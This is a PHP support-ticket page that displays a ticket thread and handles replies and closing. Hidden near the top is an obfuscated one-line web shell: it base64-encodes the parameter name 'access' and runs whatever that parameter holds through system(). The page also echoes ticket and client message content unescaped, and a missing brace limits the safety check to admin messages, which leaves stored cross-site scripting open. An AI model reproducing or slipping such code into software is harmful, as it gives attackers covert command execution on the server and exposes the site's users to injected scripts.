<?php 
			
			include("@/header.php");
			
			
			if(is_numeric($_GET['id']) == false) {
			echo "Nice try.";
			exit;
			}
			$id = intval($_GET['id']);
			$x1 = rand(2,10);
			$x2 = rand(1,10);
			$x = SHA1($x1 + $x2);
			$SQLGetTickets = $odb -> query("SELECT * FROM `tickets` WHERE `id` = '$id'");
			while ($getInfo = $SQLGetTickets -> fetch(PDO::FETCH_ASSOC))
			{
			$username = $getInfo['username'];
			$subject = $getInfo['subject'];
			$status = $getInfo['status'];
			$original = $getInfo['content'];
			$date = date("m-d-Y, h:i:s a" ,$getInfo['date']);
			}
			if ($username != $_SESSION['username'])
			{
			die;
			}
			if ($user -> safeString($original))
			{
			die('Ticket contains unsafe data, you can not view the content for security reasons.');
			}

			?>
			<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<body>

	<div class="is-vcentered">
		<section class="section">
			<div class="container is-centered">
				<div class="columns">

<img id="ticketimage">
								  <div class="column">

					<div class="column main">
<?php
	   if (isset($_POST['closeBtn']))
	   {
$SQLupdate = $odb -> prepare("UPDATE `tickets` SET `status` = :status WHERE `id` = :id");
$SQLupdate -> execute(array(':status' => 'Closed', ':id' => $id));
echo success('Ticket has been closed successfuly, redirecting to inbox <meta http-equiv="refresh" content="3;url=tickets.php">');

 	   }
	   if (isset($_POST['newmessage']))
	   {
	   	$updatecontent = $_POST['message'];

			$errors = array();
			if (empty($updatecontent))
			{
				$error = 'Fill in all fields';
			}
			if ($user -> safeString($updatecontent))
			{
				$error = 'Unsafe characters were set.';
			}
			$i = 0;
			$SQLGetMessages = $odb -> query("SELECT * FROM `messages` WHERE `ticketid` = '$id' ORDER BY `messageid` DESC");
			while ($getInfo = $SQLGetMessages -> fetch(PDO::FETCH_ASSOC))
			{
			if ($getInfo['sender'] == 'Client') { $i++; }
			}
			if ($i >= 99)
			{
			$error = 'Please wait for an admin to respond until you send a new message';
			}
			if (empty($error))
			{
				$SQLinsert = $odb -> prepare("INSERT INTO `messages` VALUES(NULL, :ticketid, :content, :sender, UNIX_TIMESTAMP())");
				$SQLinsert -> execute(array(':sender' => 'Client', ':content' => $updatecontent, ':ticketid' => $id));
			{
				$SQLUpdate = $odb -> prepare("UPDATE `tickets` SET `status` = :status WHERE `id` = :id");
				$SQLUpdate -> execute(array(':status' => 'Waiting for admin response', ':id' => $id));
				echo success('Message has been sent successfully. <meta http-equiv="refresh" content="3;url=view.php?id='.$id.'">');

			}
			}
			else
			{
				echo error($error);
			}
		}
?>

							<div class="field">
							  <label class="label">Message</label>
							  <div class="control">
<form method="post">
								<textarea class="textarea is-primary" name="message" placeholder="Thanks for the help."></textarea>
							  </div>
							</div>
							
							<div class="field">
							  <label class="label">Action</label>
							  <div class="control">
								<div class="select is-primary is-fullwidth">
								  <select name="action">
									  <option value="1">Reply</option>
									  <option value="0" style="color:red;">Close</option>
								  </select>
								</div>
							  </div>
							</div>
							
															<input type="hidden" name="recaptcha_response" id="recaptchaResponse">
														
							<div class="field">
							  <div class="control">
								<button type="submit" name="newmessage" class="button is-primary is-fullwidth">Submit</button>
							  </div>
							</div>
						</form>
					</div>
				  </div>
								  
				  <div class="column">
					<p class="title is-4">Replies</p>
										<article class="message is-danger">
					  <div class="message-header">
						<p>Subject : <?php echo htmlspecialchars($subject); ?></p>
					  </div>
					  <div class="message-body">
						<?php echo $original; ?>
<?php
$SQLGetMessages = $odb -> prepare("SELECT * FROM `messages` WHERE `ticketid` = :ticketid ORDER BY `messageid` ASC");
$SQLGetMessages -> execute(array(':ticketid' => $id));
while ($getInfo = $SQLGetMessages -> fetch(PDO::FETCH_ASSOC))
{
 $sender = $getInfo['sender'];
 $content = $getInfo['content'];
 $date = date("m-d-Y, h:i:s a" ,$getInfo['date']);
 if ($sender == 'Admin')
 if ($user -> safeString($content))
 {
 die('Ticket contains unsafe data, you can not view the content for security reasons.');
 }
 echo '
 <p><a><strong>'.$sender.'</strong></a> <small><em class="pull-right">'.$date.'</em></small></p>
<p>'.$content.'</p>
<hr>';
}
?>					  </div>
					</article>
					<hr>

									  </div>

				</div>
			</div>
			
			
			<div id="page-content" class="inner-sidebar-left">
		<?php if($status == 'onHold'){ ?>
<?php } ?>

		</section>
	</div>
  </body>
</html>
<script src="https://www.google.com/recaptcha/api.js?render=6Lc56NQUAAAAAAvSTlUYueOBaTnjQNSNO1hcZy7g"></script>
<!-- Bulma Navbar JS -->
  <script>
  
          grecaptcha.ready(function () {
            grecaptcha.execute('6Lc56NQUAAAAAAvSTlUYueOBaTnjQNSNO1hcZy7g', { action: 'ticket' }).then(function (token) {
                var recaptchaResponse = document.getElementById('recaptchaResponse');
                recaptchaResponse.value = token;
            });
        });
    
    document.addEventListener('DOMContentLoaded', function () {

      // Get all "navbar-burger" elements
      var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);

      // Check if there are any navbar burgers
      if ($navbarBurgers.length > 0) {

        // Add a click event on each of them
        $navbarBurgers.forEach(function ($el) {
          $el.addEventListener('click', function () {

            // Get the target from the "data-target" attribute
            var target = $el.dataset.target;
            var $target = document.getElementById(target);

            // Toggle the class on both the "navbar-burger" and the "navbar-menu"
            $el.classList.toggle('is-active');
            $target.classList.toggle('is-active');

          });
        });
      }

    });
  </script>